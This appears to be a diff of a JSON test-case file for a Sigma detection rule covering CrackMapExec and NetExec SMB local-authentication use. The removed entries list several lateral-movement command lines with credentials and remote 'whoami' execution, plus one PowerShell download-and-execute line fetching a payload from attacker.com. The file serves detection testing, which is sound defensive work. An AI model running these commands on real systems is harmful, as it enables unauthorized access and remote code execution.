@@ -1,42 +1,6 @@
 [
   {
-    "output": "cme.exe smb 192.168.1.100 --local-auth --username Administrator --password \"P@ssw0rd123!\" -x whoami",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "cme.exe",
-    "explanation": "This is an incomplete command and does not match any detection criteria in the Sigma rule."
-  },
-  {
-    "output": "cme smb 172.16.10.5/24 -u 'user' -p 'pass' --local-auth",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "cme.exe smb 192.168.1.0/24 -u\"Administrator\" -p\"Password123!\" --local-auth -x\"whoami\"",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "update.exe smb 10.0.0.0/24 --username admin --password pass --local-auth --exec-method smbexec -x whoami",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "powershell.exe -Command \"copy-item 'powershell.exe' -Destination 'cme.exe'\" && cme.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "crackmapexec.exe smb 192.168.1.10/24 --user='admin' --pass='password' --local-auth",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "netexec smb 172.16.10.5 -u 'Administrator' -p 'P@ssword123' --local-auth",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "cme.exe smb 192.168.1.100 --local-auth --user Administrator --pass P@ssw0rd123",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "crackmapexec.exe smb 172.16.5.0/24 --local-auth -u admin -p pass",
-    "explanation": "This is a true positive command and cannot be bypassed as it matches the Sigma rule's detection criteria."
+    "output": "C:\\Tools\\crackmapexec.exe smb 192.0.2.10",
+    "explanation": "The original command line is already a valid test command for the Sigma rule. No mutation is needed to trigger the rule."
   }
 ]
